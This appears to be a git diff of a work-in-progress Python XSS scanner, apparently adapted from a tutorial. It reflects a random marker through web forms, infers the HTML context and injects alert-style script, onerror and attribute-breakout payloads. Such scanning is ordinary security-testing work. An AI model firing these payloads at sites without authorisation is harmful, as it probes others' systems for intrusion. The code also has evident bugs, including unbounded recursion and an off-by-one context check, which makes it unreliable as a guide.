@@ -1,7 +1,7 @@
 #the original script was taken from https://thepythoncode.com/article/make-a-xss-vulnerability-scanner-in-python
 #this is still a work in progress. I am modifying the script to look for more xss vulnerabilities
-#at the moment it's been modified to enter a unique 8 character string into each field on a site and then return the lines of html where the string shows up
-#later updates will analyze where the string is to determine what methods of attack the site may be vulnerable to and try them
+#at the moment it's been modified to enter a unique 8 character string into each field on a site and determine the context of where the string is. Based on that context it determines the paylaod to use
+#later updates will add payloads for strings that are in javascript, and add more payloads and methods of attack
 
 import requests
 from pprint import pprint
@@ -38,8 +38,9 @@ def get_form_details(form):
     details["inputs"] = inputs
     return details
 
-ran_arr=[]
-def submit_form(form_details, url, value):
+ran_arr = []
+
+def submit_form(form_details, url, payload):
     """
     Submits a form given in `form_details`
     Params:
@@ -57,11 +58,13 @@ def submit_form(form_details, url, value):
     for input in inputs:
         # places a random string in the field 
         if input["type"] == "text" or input["type"] == "search":
-            ran = ''.join(random.choices(string.ascii_lowercase +
-                             string.digits, k=8))
-            ran_arr.append(ran)
-            input["value"] = ran
-            #input["value"] = value
+            if payload == "ran":
+                ran = ''.join(random.choices(string.ascii_lowercase +
+                                 string.digits, k=8))
+                ran_arr.append(ran)
+                input["value"] = ran
+            else:
+                input["value"] = payload
         input_name = input.get("name")
         input_value = input.get("value")
         if input_name and input_value:
@@ -77,8 +80,8 @@ def submit_form(form_details, url, value):
         # GET request
         return requests.get(target_url, params=data)
 
-
-def scan_xss(url):
+prev_payload = False
+def scan_xss(url, payload):
     """
     Given a `url`, it prints all XSS vulnerable forms and 
     returns True if any is vulnerable, False otherwise
@@ -86,23 +89,69 @@ def scan_xss(url):
     # get all the forms from the URL
     forms = get_all_forms(url)
     print(f"[+] Detected {len(forms)} forms on {url}.")
-    js_script = "<Script>alert('hi')</scripT>"
     # returning value
     is_vulnerable = False
     # iterate over all forms
+    dtr = []
     for form in forms:
         form_details = get_form_details(form)
-        content = submit_form(form_details, url, js_script).content.decode()
+        content = submit_form(form_details, url, payload).content.decode()
         
-        for val in ran_arr:
-            ran_list = soup.find_all(string=val)
-            for ran in ran_arr:
-            	print(ran.get_text())
-        
-    return is_vulnerable
+        if payload in content:
+            print(f"[+] XSS Detected on {url}")
+            print(f"[*] Form details:")
+            pprint(form_details)
+            is_vulnerable = True
+        #looks for random value in html, if it finds it add the line of html containing value to a list
+        else:
+            for val in ran_arr:
+                for line in content.splitlines():
+                    if val in line:
+                        dtr.append(line)
+            alt_payload = dtr_context(dtr)
+            scan_xss(url,alt_payload) 
 
+def dtr_context(lines):
+    for line in lines:
+        print(line) 
+        print(line.split(ran_arr[0])[1])
+        str_split=line.split(ran_arr[0])[1]
+        if str_split[1]=="<":
+            print("between html tag")
+            context="between"
+        elif str_split[1]==">":
+            print("within html tags")
+            context="within"
+        else:
+            print("potentially within javascript or was not caught correctly. haven't gotten to this yet")
+            context="other"
+        payload = dtr_payload(context)
+        return payload
+
+
+def dtr_payload(context):
+    global prev_payload
+    if context == "between":
+        if prev_payload:
+            payload="<img src=1 onerror=alert(1)>"
+        else:
+            payload="<script>alert(document.domain)</script>"
+            prev_payload=True
+        
+    elif context == "within":
+        if prev_payload:
+            payload='"><script>alert(document.domain)</script>'
+            
+        else:
+            payload='" autofocus onfocus=alert(document.domain) x="'
+            prev_payload=True
+        
+    #else:
+        #add payloads for strings inside javascript
+    
+    return payload
 
 if __name__ == "__main__":
     import sys
     url = sys.argv[1]
-    print(scan_xss(url))
+    print(scan_xss(url, "ran"))
